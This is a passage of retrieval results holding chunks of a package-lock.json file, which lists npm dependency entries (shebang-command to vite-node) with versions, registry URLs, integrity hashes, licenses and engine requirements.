\"sha512-E5LDX7Wrp85Kil5bhZv46j8jOeboKq5JMmYM3gVGdGH8xFpPWXUMsNrlODCrkoxMEeNi/XZIwuRvY4XNwYMJpw==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/shebang-command\": {\n      \"version\": \"2.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/shebang-command/-/shebang-command-2.0.0.tgz\",\n      \"integrity\": \"sha512-kHxr2zZpYtdmrN1qDjrrX/Z1rR1kG8Dx+gkpK1G4eXmvXswmcE1hTWBWYUzlraYw1/yZp6YuDY77YtvbN0dmDA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"shebang-regex\": \"^3.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/shebang-regex\": {\n      \"version\": \"3.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/shebang-regex/-/shebang-regex-3.0.0.tgz\",\n      \"integrity\": \"sha512-7++dFhtcx3353uBaq8DDR4NuxBetBzC7ZQOhmTQInHEd6bSrXdiEyzCvG07Z44UYdLShWUyXt5M/yhz8ekcb1A==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/shell-quote\": {\n      \"version\": \"1.8.3\",\n      \"resolved\": \"https://registry.npmjs.org/shell-quote/-/shell-quote-1.8.3.tgz\",\n      \"integrity\": \"sha512-ObmnIF4hXNg1BqhnHmgbDETF8dLPCggZWBjkQfhZpbszZnYur5DUljTcCHii5LC3J5E0yeO/1LIMyH+UvHQgyw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 0.4\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/ljharb\"\n      }\n    },\n    \"node_modules/siginfo\": {\n      \"version\": \"2.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/siginfo/-/siginfo-2.0.0.tgz\",\n      \"integrity\": \"sha512-ybx0WO1/8bSBLEWXZvEd7gMW3Sn3JFlW3TvX1nREbDLRNQNaeNN8WK0meBwPdAaOI7TtRRRJn/Es1zhrrCHu7g==\",\n      \"dev\": true,\n      \"license\": \"ISC\"\n    },\n    \"node_modules/signal-exit\": {\n      \"version\": \"4.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/signal-exit/-/signal-exit-4.1.0.tgz\",\n      \"integrity\": \"sha512-bzyZ1e88w9O1iNJbKnOlvYTrWPDl46O1bG0D3XInv+9tkPrxrN8jUUTiFlDkkmKWgn1M6CfIA13SuGqOa9Korw==\",\n      \"license\": \"ISC\",\n      \"engines\": {\n        \"node\": \">=14\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/isaacs\"\n      }\n    },\n    \"node_modules/simple-concat\": {\n      \"version\": \"1.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/simple-concat/-/simple-concat-1.0.1.tgz\",\n      \"integrity\": \"sha512-cSFtAPtRhljv69IK0hTVZQ+OfE9nePi/rtJmw5UjHeVyVroEqJXP1sFztKUy1qU+xvz3u/sfYJLa947b7nAN2Q==\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/feross\"\n        },\n        {\n          \"type\": \"patreon\",\n          \"url\": \"https://www.patreon.com/feross\"\n        },\n        {\n          \"type\": \"consulting\",\n          \"url\": \"https://feross.org/support\"\n        }\n      ],\n      \"license\": \"MIT\"\n    },\n    \"node_modules/simple-get\": {\n      \"version\": \"4.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/simple-get/-/simple-get-4.0.1.tgz\",\n      \"integrity\": \"sha512-brv7p5WgH0jmQJr1ZDDfKDOSeWWg+OVypG99A/5vYGPqJ6pxiaHLy8nxtFjBA7oMa01ebA9gfh1uMCFqOuXxvA==\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/feross\"\n        },\n        {\n          \"type\": \"patreon\",\n          \"url\": \"https://www.patreon.com/feross\"\n        },\n        {\n          \"type\": \"consulting\",\n          \"url\": \"https://feross.org/support\"\n        }\n      ],\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"decompress-response\": \"^6.0.0\",\n        \"once\": \"^1.3.1\",\n        \"simple-concat\": \"^1.0.0\"\n      }\n    },", "metadata": {"file": "package-lock.json", "start_line": 4801, "end_line": 5000, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:5001", "score": 0.0, "content": "    \"node_modules/sonic-boom\": {\n      \"version\": \"3.8.1\",\n      \"resolved\": \"https://registry.npmjs.org/sonic-boom/-/sonic-boom-3.8.1.tgz\",\n      \"integrity\": \"sha512-y4Z8LCDBuum+PBP3lSV7RHrXscqksve/bi0as7mhwVnBW+/wUqKT/2Kb7um8yqcFy0duYbbPxzt89Zy2nOCaxg==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"atomic-sleep\": \"^1.0.0\"\n      }\n    },\n    \"node_modules/source-map-js\": {\n      \"version\": \"1.2.1\",\n      \"resolved\": \"https://registry.npmjs.org/source-map-js/-/source-map-js-1.2.1.tgz\",\n      \"integrity\": \"sha512-UXWMKhLOwVKb728IUtQPXxfYU+usdybtUrK/8uGE8CQMvrhOpwvzDBwj0QhSL7MQc7vIsISBG8VQ8+IDQxpfQA==\",\n      \"dev\": true,\n      \"license\": \"BSD-3-Clause\",\n      \"engines\": {\n        \"node\": \">=0.10.0\"\n      }\n    },\n    \"node_modules/spawn-command\": {\n      \"version\": \"0.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/spawn-command/-/spawn-command-0.0.2.tgz\",\n      \"integrity\": \"sha512-zC8zGoGkmc8J9ndvml8Xksr1Amk9qBujgbF0JAIWO7kXr43w0h/0GJNM/Vustixu+YE8N/MTrQ7N31FvHUACxQ==\",\n      \"dev\": true\n    },\n    \"node_modules/split2\": {\n      \"version\": \"4.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/split2/-/split2-4.2.0.tgz\",\n      \"integrity\": \"sha512-UcjcJOWknrNkF6PLX83qcHM6KHgVKNkV62Y8a5uYDVv9ydGQVwAHMKqHdJje1VTWpljG0WYpCDhrCdAOYH4TWg==\",\n      \"license\": \"ISC\",\n      \"engines\": {\n        \"node\": \">= 10.x\"\n      }\n    },\n    \"node_modules/stackback\": {\n      \"version\": \"0.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/stackback/-/stackback-0.0.2.tgz\",\n      \"integrity\": \"sha512-1XMJE5fQo1jGH6Y/7ebnwPOBEkIEnT4QF32d5R1+VXdXveM0IBMJt8zfaxX1P3QhVwrYe+576+jkANtSS2mBbw==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/statuses\": {\n      \"version\": \"2.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/statuses/-/statuses-2.0.1.tgz\",\n      \"integrity\": \"sha512-RwNA9Z/7PrK06rYLIzFMlaF+l73iwpzsqRIFgbMLbTcLD6cOao82TaWefPXQvB2fOC4AjuYSEndS7N/mTCbkdQ==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 0.8\"\n      }\n    },\n    \"node_modules/std-env\": {\n      \"version\": \"3.10.0\",\n      \"resolved\": \"https://registry.npmjs.org/std-env/-/std-env-3.10.0.tgz\",\n      \"integrity\": \"sha512-5GS12FdOZNliM5mAOxFRg7Ir0pWz8MdpYm6AY6VPkGpbA7ZzmbzNcBJQ0GPvvyWgcY7QAhCgf9Uy89I03faLkg==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/stream-shift\": {\n      \"version\": \"1.0.3\",\n      \"resolved\": \"https://registry.npmjs.org/stream-shift/-/stream-shift-1.0.3.tgz\",\n      \"integrity\": \"sha512-76ORR0DO1o1hlKwTbi/DM3EXWGf3ZJYO8cXX5RJwnul2DEg2oyoZyjLNoQM8WsvZiFKCRfC1O0J7iCvie3RZmQ==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/stream-wormhole\": {\n      \"version\": \"1.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/stream-wormhole/-/stream-wormhole-1.1.0.tgz\",\n      \"integrity\": \"sha512-gHFfL3px0Kctd6Po0M8TzEvt3De/xu6cnRrjlfYNhwbhLPLwigI2t1nc6jrzNuaYg5C4YF78PPFuQPzRiqn9ew==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=4.0.0\"\n      }\n    },\n    \"node_modules/string_decoder\": {\n      \"version\": \"1.3.0\",\n      \"resolved\": \"https://registry.npmjs.org/string_decoder/-/string_decoder-1.3.0.tgz\",\n      \"integrity\": \"sha512-hkRX8U1WjJFd8LsDJ2yQ/wWWxaopEsABU1XfkM8A+j0+85JAGppt16cr1Whg6KIbb4okU6Mql6BOj+uup/wKeA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"safe-buffer\": \"~5.2.0\"\n      }\n    },\n    \"node_modules/string-width\": {\n      \"version\": \"4.2.3\",\n      \"resolved\": \"https://registry.npmjs.org/string-width/-/string-width-4.2.3.tgz\",\n      \"integrity\": \"sha512-wKyQRQpjJ0sIp62ErSZdGsjMJWsap5oRNihHhu6G7JVO/9jIB6UyevL+tXuOqrng8j/cxKTWyWUwvSTriiZz/g==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"emoji-regex\": \"^8.0.0\",\n        \"is-fullwidth-code-point\": \"^3.0.0\",\n        \"strip-ansi\": \"^6.0.1\"\n      },\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/string-width-cjs\": {\n      \"name\": \"string-width\",\n      \"version\": \"4.2.3\",\n      \"resolved\": \"https://registry.npmjs.org/string-width/-/string-width-4.2.3.tgz\",\n      \"integrity\": \"sha512-wKyQRQpjJ0sIp62ErSZdGsjMJWsap5oRNihHhu6G7JVO/9jIB6UyevL+tXuOqrng8j/cxKTWyWUwvSTriiZz/g==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"emoji-regex\": \"^8.0.0\",\n        \"is-fullwidth-code-point\": \"^3.0.0\",\n        \"strip-ansi\": \"^6.0.1\"\n      },\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/strip-ansi\": {\n      \"version\": \"6.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/strip-ansi/-/strip-ansi-6.0.1.tgz\",\n      \"integrity\": \"sha512-Y38VPSHcqkFrCpFnQ9vuSXmquuv5oXOKpGeT6aGrr3o3Gc9AlVa6JBfUSOCnbxGGZF+/0ooI7KrPuUSztUdU5A==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"ansi-regex\": \"^5.0.1\"\n      },\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/strip-ansi-cjs\": {\n      \"name\": \"strip-ansi\",\n      \"version\": \"6.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/strip-ansi/-/strip-ansi-6.0.1.tgz\",\n      \"integrity\": \"sha512-Y38VPSHcqkFrCpFnQ9vuSXmquuv5oXOKpGeT6aGrr3o3Gc9AlVa6JBfUSOCnbxGGZF+/0ooI7KrPuUSztUdU5A==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"ansi-regex\": \"^5.0.1\"\n      },\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/strip-final-newline\": {\n      \"version\": \"3.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/strip-final-newline/-/strip-final-newline-3.0.0.tgz\",\n      \"integrity\": \"sha512-dOESqjYr96iWYylGObzd39EuNTa5VJxyvVAEm5Jnh7KGo75V43Hk1odPQkNDyXNmUR6k+gEiDVXnjB8HJ3crXw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=12\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/sindresorhus\"\n      }\n    },\n    \"node_modules/strip-json-comments\": {\n      \"version\": \"3.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/strip-json-comments/-/strip-json-comments-3.1.1.tgz\",\n      \"integrity\": \"sha512-6fPc+R4ihwqP6N/aIv2f1gMH8lOVtWQHoqC4yK6oSDVVocumAsfCqjkXnqiYMhmMwS/mEHLp7Vehlt3ql6lEig==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=8\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/sindresorhus\"\n      }\n    },\n    \"node_modules/strip-literal\": {\n      \"version\": \"2.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/strip-literal/-/strip-literal-2.1.1.tgz\",\n      \"integrity\": \"sha512-631UJ6O00eNGfMiWG78ck80dfBab8X6IVFB51jZK5Icd7XAs60Z5y7QdSd/wGIklnWvRbUNloVzhOKKmutxQ6Q==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"js-tokens\": \"^9.0.1\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/antfu\"\n      }\n    },\n    \"node_modules/strip-literal/node_modules/js-tokens\": {\n      \"version\": \"9.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/js-tokens/-/js-tokens-9.0.1.tgz\",\n      \"integrity\": \"sha512-mxa9E9ITFOt0ban3j6L5MpjwegGz6lBQmM1IJkWeBZGcMxto50+eWdjC/52xDbS2vy0k7vIMK0Fe2wfL9OQSpQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/supports-color\": {\n      \"version\": \"8.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/supports-color/-/supports-color-8.1.1.tgz\",\n      \"integrity\": \"sha512-MpUEN2OodtUzxvKQl72cUF7RQ5EiHsGvSsVG0ia9c5RbWGL2CI4C7EpPS8UTBIplnlzZiNuV56w+FuNxy3ty2Q==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"has-flag\": \"^4.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=10\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/chalk/supports-color?sponsor=1\"\n      }\n    },\n    \"node_modules/tar\": {\n      \"version\": \"6.2.1\",\n      \"resolved\": \"https://registry.npmjs.org/tar/-/tar-6.2.1.tgz\",\n      \"integrity\": \"sha512-DZ4yORTwrbTj/7MZYq2w+/ZFdI6OZ/f9SFHR+71gIVUZhOQPHzVCLpvRnPgyaMpfWxxk/4ONva3GQSyNIKRv6A==\",", "metadata": {"file": "package-lock.json", "start_line": 5001, "end_line": 5200, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:5201", "score": 0.0, "content": "      \"deprecated\": \"Old versions of tar are not supported, and contain widely publicized security vulnerabilities, which have been fixed in the current version. Please update. Support for old versions may be purchased (at exhorbitant rates) by contacting i@izs.me\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"chownr\": \"^2.0.0\",\n        \"fs-minipass\": \"^2.0.0\",\n        \"minipass\": \"^5.0.0\",\n        \"minizlib\": \"^2.1.1\",\n        \"mkdirp\": \"^1.0.3\",\n        \"yallist\": \"^4.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=10\"\n      }\n    },\n    \"node_modules/tar-fs\": {\n      \"version\": \"2.1.4\",\n      \"resolved\": \"https://registry.npmjs.org/tar-fs/-/tar-fs-2.1.4.tgz\",\n      \"integrity\": \"sha512-mDAjwmZdh7LTT6pNleZ05Yt65HC3E+NiQzl672vQG38jIrehtJk/J3mNwIg+vShQPcLF/LV7CMnDW6vjj6sfYQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"chownr\": \"^1.1.1\",\n        \"mkdirp-classic\": \"^0.5.2\",\n        \"pump\": \"^3.0.0\",\n        \"tar-stream\": \"^2.1.4\"\n      }\n    },\n    \"node_modules/tar-fs/node_modules/chownr\": {\n      \"version\": \"1.1.4\",\n      \"resolved\": \"https://registry.npmjs.org/chownr/-/chownr-1.1.4.tgz\",\n      \"integrity\": \"sha512-jJ0bqzaylmJtVnNgzTeSOs8DPavpbYgEr/b0YL8/2GO3xJEhInFmhKMUnEJQjZumK7KXGFhUy89PrsJWlakBVg==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/tar-stream\": {\n      \"version\": \"2.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/tar-stream/-/tar-stream-2.2.0.tgz\",\n      \"integrity\": \"sha512-ujeqbceABgwMZxEJnk2HDY2DlnUZ+9oEcb1KzTVfYHio0UE6dG71n60d8D2I4qNvleWrrXpmjpt7vZeF1LnMZQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"bl\": \"^4.0.3\",\n        \"end-of-stream\": \"^1.4.1\",\n        \"fs-constants\": \"^1.0.0\",\n        \"inherits\": \"^2.0.3\",\n        \"readable-stream\": \"^3.1.1\"\n      },\n      \"engines\": {\n        \"node\": \">=6\"\n      }\n    },\n    \"node_modules/tar/node_modules/minipass\": {\n      \"version\": \"5.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/minipass/-/minipass-5.0.0.tgz\",\n      \"integrity\": \"sha512-3FnjYuehv9k6ovOEbyOswadCDPX1piCfhV8ncmYtHOjuPwylVWsghTLo7rabjC3Rx5xD4HDx8Wm1xnMF7S5qFQ==\",\n      \"license\": \"ISC\",\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/tar/node_modules/yallist\": {\n      \"version\": \"4.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/yallist/-/yallist-4.0.0.tgz\",\n      \"integrity\": \"sha512-3wdGidZyq5PB084XLES5TpOSRA3wjXAlIWMhum2kRcv/41Sn2emQ0dycQW4uZXLejwKvg6EsvbdlVL+FYEct7A==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/thirty-two\": {\n      \"version\": \"1.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/thirty-two/-/thirty-two-1.0.2.tgz\",\n      \"integrity\": \"sha512-OEI0IWCe+Dw46019YLl6V10Us5bi574EvlJEOcAkB29IzQ/mYD1A6RyNHLjZPiHCmuodxvgF6U+vZO1L15lxVA==\",\n      \"engines\": {\n        \"node\": \">=0.2.6\"\n      }\n    },\n    \"node_modules/thread-stream\": {\n      \"version\": \"2.7.0\",\n      \"resolved\": \"https://registry.npmjs.org/thread-stream/-/thread-stream-2.7.0.tgz\",\n      \"integrity\": \"sha512-qQiRWsU/wvNolI6tbbCKd9iKaTnCXsTwVxhhKM6nctPdujTyztjlbUkUTUymidWcMnZ5pWR0ej4a0tjsW021vw==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"real-require\": \"^0.2.0\"\n      }\n    },\n    \"node_modules/tinybench\": {\n      \"version\": \"2.9.0\",\n      \"resolved\": \"https://registry.npmjs.org/tinybench/-/tinybench-2.9.0.tgz\",\n      \"integrity\": \"sha512-0+DUvqWMValLmha6lr4kD8iAMK1HzV0/aKnCtWb9v9641TnP/MFb7Pc2bxoxQjTXAErryXVgUOfv2YqNllqGeg==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/tinypool\": {\n      \"version\": \"0.8.4\",\n      \"resolved\": \"https://registry.npmjs.org/tinypool/-/tinypool-0.8.4.tgz\",\n      \"integrity\": \"sha512-i11VH5gS6IFeLY3gMBQ00/MmLncVP7JLXOw1vlgkytLmJK7QnEr7NXf0LBdxfmNPAeyetukOk0bOYrJrFGjYJQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=14.0.0\"\n      }\n    },\n    \"node_modules/tinyspy\": {\n      \"version\": \"2.2.1\",\n      \"resolved\": \"https://registry.npmjs.org/tinyspy/-/tinyspy-2.2.1.tgz\",\n      \"integrity\": \"sha512-KYad6Vy5VDWV4GH3fjpseMQ/XU2BhIYP7Vzd0LG44qRWm/Yt2WCOTicFdvmgo6gWaqooMQCawTtILVQJupKu7A==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=14.0.0\"\n      }\n    },\n    \"node_modules/toad-cache\": {\n      \"version\": \"3.7.0\",\n      \"resolved\": \"https://registry.npmjs.org/toad-cache/-/toad-cache-3.7.0.tgz\",\n      \"integrity\": \"sha512-/m8M+2BJUpoJdgAHoG+baCwBT+tf2VraSfkBgl0Y00qIWt41DJ8R5B8nsEw0I58YwF5IZH6z24/2TobDKnqSWw==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/toidentifier\": {\n      \"version\": \"1.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/toidentifier/-/toidentifier-1.0.1.tgz\",\n      \"integrity\": \"sha512-o5sSPKEkg/DIQNmH43V0/uerLrpzVedkUh8tGNvaeXpfpuwjKenlSox/2O/BTlZUtEe+JG7s5YhEz608PlAHRA==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=0.6\"\n      }\n    },\n    \"node_modules/tr46\": {\n      \"version\": \"0.0.3\",\n      \"resolved\": \"https://registry.npmjs.org/tr46/-/tr46-0.0.3.tgz\",\n      \"integrity\": \"sha512-N3WMsuqV66lT30CrXNbEjx4GEwlow3v6rr4mCcv6prnfwhS01rkgyFdjPNBYd9br7LpXV1+Emh01fHnq2Gdgrw==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/tree-kill\": {\n      \"version\": \"1.2.2\",\n      \"resolved\": \"https://registry.npmjs.org/tree-kill/-/tree-kill-1.2.2.tgz\",\n      \"integrity\": \"sha512-L0Orpi8qGpRG//Nd+H90vFB+3iHnue1zSSGmNOOCh1GLJ7rUKVwV2HvijphGQS2UmhUZewS9VgvxYIdgr+fG1A==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"bin\": {\n        \"tree-kill\": \"cli.js\"\n      }\n    },\n    \"node_modules/tslib\": {\n      \"version\": \"2.8.1\",\n      \"resolved\": \"https://registry.npmjs.org/tslib/-/tslib-2.8.1.tgz\",\n      \"integrity\": \"sha512-oJFu94HQb+KVduSUQL7wnpmqnfmLsOA/nAh6b6EH0wCEoK0/mPeXU6c3wKDV83MkOuHPRHtSXKKU99IBazS/2w==\",\n      \"dev\": true,\n      \"license\": \"0BSD\"\n    },\n    \"node_modules/tsx\": {\n      \"version\": \"4.21.0\",\n      \"resolved\": \"https://registry.npmjs.org/tsx/-/tsx-4.21.0.tgz\",\n      \"integrity\": \"sha512-5C1sg4USs1lfG0GFb2RLXsdpXqBSEhAaA/0kPL01wxzpMqLILNxIxIOKiILz+cdg/pLnOUxFYOR5yhHU666wbw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"esbuild\": \"~0.27.0\",\n        \"get-tsconfig\": \"^4.7.5\"\n      },\n      \"bin\": {\n        \"tsx\": \"dist/cli.mjs\"\n      },\n      \"engines\": {\n        \"node\": \">=18.0.0\"\n      },\n      \"optionalDependencies\": {\n        \"fsevents\": \"~2.3.3\"\n      }\n    },\n    \"node_modules/tunnel-agent\": {\n      \"version\": \"0.6.0\",\n      \"resolved\": \"https://registry.npmjs.org/tunnel-agent/-/tunnel-agent-0.6.0.tgz\",\n      \"integrity\": \"sha512-McnNiV1l8RYeY8tBgEpuodCC1mLUdbSN+CYBL7kJsJNInOP8UjDDEwdk6Mw60vdLLrr5NHKZhMAOSrR2NZuQ+w==\",\n      \"license\": \"Apache-2.0\",\n      \"dependencies\": {\n        \"safe-buffer\": \"^5.0.1\"\n      },\n      \"engines\": {\n        \"node\": \"*\"\n      }\n    },\n    \"node_modules/type-detect\": {\n      \"version\": \"4.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/type-detect/-/type-detect-4.1.0.tgz\",\n      \"integrity\": \"sha512-Acylog8/luQ8L7il+geoSxhEkazvkslg7PSNKOX59mbB9cOveP5aq9h74Y7YU8yDpJwetzQQrfIwtf4Wp4LKcw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=4\"\n      }\n    },\n    \"node_modules/typescript\": {\n      \"version\": \"5.9.3\",\n      \"resolved\": \"https://registry.npmjs.org/typescript/-/typescript-5.9.3.tgz\",\n      \"integrity\": \"sha512-jl1vZzPDinLr9eUt3J/t7V6FgNEw9QjvBPdysz9KfQDD41fQrC2Y4vKQdiaUpFT4bXlb1RHhLpp8wtm6M5TgSw==\",\n      \"dev\": true,\n      \"license\": \"Apache-2.0\",\n      \"bin\": {\n        \"tsc\": \"bin/tsc\",\n        \"tsserver\": \"bin/tsserver\"\n      },", "metadata": {"file": "package-lock.json", "start_line": 5201, "end_line": 5400, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:5401", "score": 0.0, "content": "      \"engines\": {\n        \"node\": \">=14.17\"\n      }\n    },\n    \"node_modules/ufo\": {\n      \"version\": \"1.6.3\",\n      \"resolved\": \"https://registry.npmjs.org/ufo/-/ufo-1.6.3.tgz\",\n      \"integrity\": \"sha512-yDJTmhydvl5lJzBmy/hyOAA0d+aqCBuwl818haVdYCRrWV84o7YyeVm4QlVHStqNrrJSTb6jKuFAVqAFsr+K3Q==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/undici-types\": {\n      \"version\": \"6.21.0\",\n      \"resolved\": \"https://registry.npmjs.org/undici-types/-/undici-types-6.21.0.tgz\",\n      \"integrity\": \"sha512-iwDZqg0QAGrg9Rav5H4n0M64c3mkR59cJ6wQp+7C4nI0gsmExaedaYLNO44eT4AtBBwjbTiGPMlt2Md0T9H9JQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/update-browserslist-db\": {\n      \"version\": \"1.2.3\",\n      \"resolved\": \"https://registry.npmjs.org/update-browserslist-db/-/update-browserslist-db-1.2.3.tgz\",\n      \"integrity\": \"sha512-Js0m9cx+qOgDxo0eMiFGEueWztz+d4+M3rGlmKPT+T4IS/jP4ylw3Nwpu6cpTTP8R1MAC1kF4VbdLt3ARf209w==\",\n      \"dev\": true,\n      \"funding\": [\n        {\n          \"type\": \"opencollective\",\n          \"url\": \"https://opencollective.com/browserslist\"\n        },\n        {\n          \"type\": \"tidelift\",\n          \"url\": \"https://tidelift.com/funding/github/npm/browserslist\"\n        },\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/ai\"\n        }\n      ],\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"escalade\": \"^3.2.0\",\n        \"picocolors\": \"^1.1.1\"\n      },\n      \"bin\": {\n        \"update-browserslist-db\": \"cli.js\"\n      },\n      \"peerDependencies\": {\n        \"browserslist\": \">= 4.21.0\"\n      }\n    },\n    \"node_modules/util-deprecate\": {\n      \"version\": \"1.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/util-deprecate/-/util-deprecate-1.0.2.tgz\",\n      \"integrity\": \"sha512-EPD5q1uXyFxJpCrLnCc1nHnq3gOa6DZBocAIiI2TaSCA7VCJ1UJDMagCzIkXNsUYfD1daK//LTEQ8xiIbrHtcw==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/vite\": {\n      \"version\": \"5.4.21\",\n      \"resolved\": \"https://registry.npmjs.org/vite/-/vite-5.4.21.tgz\",\n      \"integrity\": \"sha512-o5a9xKjbtuhY6Bi5S3+HvbRERmouabWbyUcpXXUA1u+GNUKoROi9byOJ8M0nHbHYHkYICiMlqxkg1KkYmm25Sw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"esbuild\": \"^0.21.3\",\n        \"postcss\": \"^8.4.43\",\n        \"rollup\": \"^4.20.0\"\n      },\n      \"bin\": {\n        \"vite\": \"bin/vite.js\"\n      },\n      \"engines\": {\n        \"node\": \"^18.0.0 || >=20.0.0\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/vitejs/vite?sponsor=1\"\n      },\n      \"optionalDependencies\": {\n        \"fsevents\": \"~2.3.3\"\n      },\n      \"peerDependencies\": {\n        \"@types/node\": \"^18.0.0 || >=20.0.0\",\n        \"less\": \"*\",\n        \"lightningcss\": \"^1.21.0\",\n        \"sass\": \"*\",\n        \"sass-embedded\": \"*\",\n        \"stylus\": \"*\",\n        \"sugarss\": \"*\",\n        \"terser\": \"^5.4.0\"\n      },\n      \"peerDependenciesMeta\": {\n        \"@types/node\": {\n          \"optional\": true\n        },\n        \"less\": {\n          \"optional\": true\n        },\n        \"lightningcss\": {\n          \"optional\": true\n        },\n        \"sass\": {\n          \"optional\": true\n        },\n        \"sass-embedded\": {\n          \"optional\": true\n        },\n        \"stylus\": {\n          \"optional\": true\n        },\n        \"sugarss\": {\n          \"optional\": true\n        },\n        \"terser\": {\n          \"optional\": true\n        }\n      }\n    },\n    \"node_modules/vite-node\": {\n      \"version\": \"1.6.1\",\n      \"resolved\": \"https://registry.npmjs.org/vite-node/-/vite-node-1.6.1.tgz\",\n      \"integrity\": \"sha512-YAXkfvGtuTzwWbDSACdJSg4A4DZiAqckWe90Zapc/sEX3XvHcw1NdurM/6od8J207tSDqNbSsgdCacBgvJKFuA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"cac\": \"^6.7.14\",\n        \"debug\": \"^4.3.4\",\n        \"pathe\": \"^1.1.1\",\n        \"picocolors\": \"^1.0.0\",\n        \"vite\": \"^5.0.0\"\n      },\n      \"bin\": {\n        \"vite-node\": \"vite-node.mjs\"\n      },\n      \"engines\": {\n        \"node\": \"^18.0.0 || >=20.0.0\"\n      },\n      \"funding\": {\n        \"url\": 